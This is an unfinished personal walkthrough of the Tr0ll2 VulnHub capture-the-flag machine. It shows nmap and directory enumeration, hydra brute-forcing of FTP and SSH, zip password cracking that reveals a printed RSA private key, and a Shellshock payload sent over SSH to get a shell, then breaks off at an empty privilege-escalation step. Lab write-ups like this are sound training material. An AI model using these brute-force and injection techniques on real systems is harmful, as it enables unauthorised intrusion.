# Tr0ll2 VulnHub Walkthrough  

This document provides a walkthrough of the Tr0ll2 virtual machine hosted on [VulnHub](https://www.vulnhub.com/). Tr0ll2 is a fun and challenging boot-to-root CTF with trolls and surprises throughout.  

## Overview  

- **Difficulty:** Intermediate  
- **Objective:** Gain root access and retrieve the final flag.  
- **Tools Used:** nmap, gobuster, netcat, ssh, and other penetration testing tools.  

## in my case the ip adress was 192.168.48.166

## Step 1: Network Discovery  

## nmap 192.168.48.166 -sV          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 23:57 EST
Nmap scan report for 192.168.48.166
Host is up (0.0084s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:4C:BC:34 (VMware)
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
                                                              


## Step 2: Web Enumeration

## Visit the HTTP service in your browser to check for any clues. Use feroxbuster to enumerate directories and hidden files.

## feroxbuster -u http://192.168.48.166/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -C404  
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.48.166/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        6l       12w      110c http://192.168.48.166/index
200      GET      266l     1363w   145645c http://192.168.48.166/tr0ll_again.jpg
200      GET        6l       12w      110c http://192.168.48.166/
200      GET       23l       23w      346c http://192.168.48.166/robots
[####################] - 19s   207630/207630  0s      found:4       errors:0      
[####################] - 19s   207629/207629  11209/s http://192.168.48.166/


## what i found 

Author
Tr0ll
Editor
VIM
noob
nope
try_harder
keep_trying
isnt_this_annoying
nothing_here
404
LOL_at_the_last_one
trolling_is_fun
zomg_is_this_it
you_found_me
I_know_this_sucks
You_could_give_up
dont_bother
will_it_ever_end
I_hope_you_scripted_this
ok_this_is_it
stop_whining
why_are_you_still_looking
just_quit
seriously_stop

## view main page source , view robot.txt , a cat_the_troll.jpg in this site :
## http://192.168.48.166/dont_bother

## strings --all cat_the_troll1.jpg
JFIF
#3-652-108?QE8<M=01F`GMTV[\[7DcjcXjQY[W
)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
"aq2
\vRH
sdwTi
 aDP
 aDP
\z!$
`aDc
(Q@0S
}}HQ\)
B6F@
T"8V

## Look Deep within y0ur_self for the answer

it maybe a hidden directory

## wget http://192.168.48.166/y0ur_self/answer.txt
--2025-01-19 00:19:31--  http://192.168.48.166/y0ur_self/answer.txt
Connecting to 192.168.48.166:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1412653 (1.3M) [text/plain]
Saving to: ‘answer.txt’

answer.txt                    100%[===============================================>]   1.35M  --.-KB/s    in 0.09s   

2025-01-19 00:19:31 (14.3 MB/s) - ‘answer.txt’ saved [1412653/1412653]


## base64 -d answer.txt >> pass.txt

## now we have a username

## let jump to hydra
## cat usr.txt
Author
Tr0ll
Editor
VIM
noob
nope
try_harder
keep_trying
isnt_this_annoying
nothing_here
404
LOL_at_the_last_one
trolling_is_fun
zomg_is_this_it
you_found_me
I_know_this_sucks
You_could_give_up
dont_bother
will_it_ever_end
I_hope_you_scripted_this
ok_this_is_it
stop_whining
why_are_you_still_looking
just_quit
seriously_stop
               

## hydra -L usr.txt -P usr.txt 192.168.48.166 ftp -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-19 00:43:57
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 625 login tries (l:25/p:25), ~40 tries per task
[DATA] attacking ftp://192.168.48.166:21/
[21][ftp] host: 192.168.48.166   login: Tr0ll   password: Tr0ll
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
                                                                                                                      
┌
## hydra -L usr.txt -P usr.txt 192.168.48.166 ssh -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-19 00:44:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 625 login tries (l:25/p:25), ~40 tries per task
[DATA] attacking ssh://192.168.48.166:22/
[22][ssh] host: 192.168.48.166   login: Tr0ll   password: Tr0ll




## Step 3: Exploiting

## ssh Tr0ll@192.168.48.166                                                  
The authenticity of host '192.168.48.166 (192.168.48.166)' can't be established.
ECDSA key fingerprint is SHA256:I3xuSgcBlIsoldKTkOyVYwx8B4NLGl0fDDTi0H6ExYg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.48.166' (ECDSA) to the list of known hosts.
Tr0ll@192.168.48.166's password: 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Oct 14 19:07:13 2014 from 10.0.0.12
Connection to 192.168.48.166 closed.

## LOL

## ftp Tr0ll@192.168.48.166                                                  
Connected to 192.168.48.166.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||39855|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.

## download the lmao.zip file and crack the passwd using pass.txt

## fcrackzip -u -D -p '/home/kali/Desktop/pass.txt' lmao.zip


PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL

## unzip lmao.zip 
Archive:  lmao.zip
[lmao.zip] noob password: ItCantReallyBeThisEasyRightLOL
  inflating: noob                    
                                                                                                                     
## cd noob
cd: not a directory: noob
                                                                                                                     
## ls
Desktop  Documents  Downloads  lmao.zip  Music  myenv  noob  Pictures  Public  Templates  Videos
                                                                                                                     
## cat noob   
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
                            

## its a ssh private key for a noob user

## ssh -i noob noob@192.168.48.166
sign_and_send_pubkey: no mutual signature supported
noob@192.168.48.166's password: 
Permission denied, please try again.
noob@192.168.48.166's password: 
Permission denied, please try again.
noob@192.168.48.166's password: 
noob@192.168.48.166: Permission denied (publickey,password).
                                                                                                                      
## ssh -i noob noob@192.168.48.166 -o PubkeyAcceptedKeyTypes=ssh-rsa
TRY HARDER LOL!
Connection to 192.168.48.166 closed.

## ssh -i noob noob@192.168.48.166 -o PubkeyAcceptedKeyTypes=ssh-rsa '() { :;}; /bin/bash'         
shell
/bin/bash: line 1: shell: command not found
pwd 
/home/noob




## Step 4: Privilege Escalation



Disclaimer

This walkthrough is for educational purposes only. Ensure you have explicit permission to test systems before proceeding.

Happy Hacking!


Let me know if you'd like to include any specific details or modifications.

